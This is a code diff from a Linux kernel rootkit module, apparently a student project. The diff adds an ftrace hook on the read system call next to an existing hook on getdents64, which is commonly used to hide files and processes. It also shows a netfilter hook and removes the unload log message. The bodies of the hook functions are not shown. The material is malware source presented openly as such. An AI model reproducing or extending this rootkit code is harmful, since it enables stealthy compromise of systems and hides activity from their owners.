@@ -6,13 +6,18 @@ MODULE_AUTHOR("Some studen of 2600, 1337");
 MODULE_DESCRIPTION("Tkt frere");
 
 int g_pid_companion = -1;
-
 asmlinkage long (*g_original_getdents)(const struct pt_regs *);
+asmlinkage long (*g_original_read)(const struct pt_regs *);
+
 
 t_ftrace_hook *g_f_hook[] = {&(t_ftrace_hook){
 	.name = "__x64_sys_getdents64",
 	.function = (myGetDents),
 	.original = (&g_original_getdents),
+},&(t_ftrace_hook){
+	.name = "__x64_sys_read",
+	.function = (myRead),
+	.original = (&g_original_read),
 }, NULL};
 
 static struct nf_hook_ops nfho = {
@@ -77,9 +82,8 @@ static void __exit rootkit_exit(void) {
 	}
 
 	fh_remove_hook(g_f_hook[0]);
-	printk(KERN_INFO "Rootkit has been unloaded\n");
+	fh_remove_hook(g_f_hook[1]);
 }
-
 
 module_init(rootkit_init);
 module_exit(rootkit_exit);
